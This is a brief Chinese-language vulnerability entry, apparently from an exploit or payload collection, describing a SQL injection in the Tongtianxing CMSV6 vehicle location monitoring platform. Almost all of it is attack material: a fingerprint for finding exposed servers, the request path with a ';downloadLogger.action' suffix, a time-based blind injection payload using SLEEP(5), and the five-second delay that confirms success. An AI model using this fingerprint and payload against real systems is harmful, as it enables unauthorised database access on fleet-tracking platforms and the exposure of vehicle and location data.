# 通天星CMSV6车载定位监控平台getAlarmAppealByGuidSQL注入漏洞

通天星CMSV6车载定位监控平台getAlarmAppealByGuid ｜ SQL注入 ｜ —
- **指纹**：`body="/808gps/"`
- **请求**：`POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1`

**Payload**
```
guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP(5)))PITq) AND ('qhqF'='qhqF
```
- **响应特征**：200 响应时间>=5s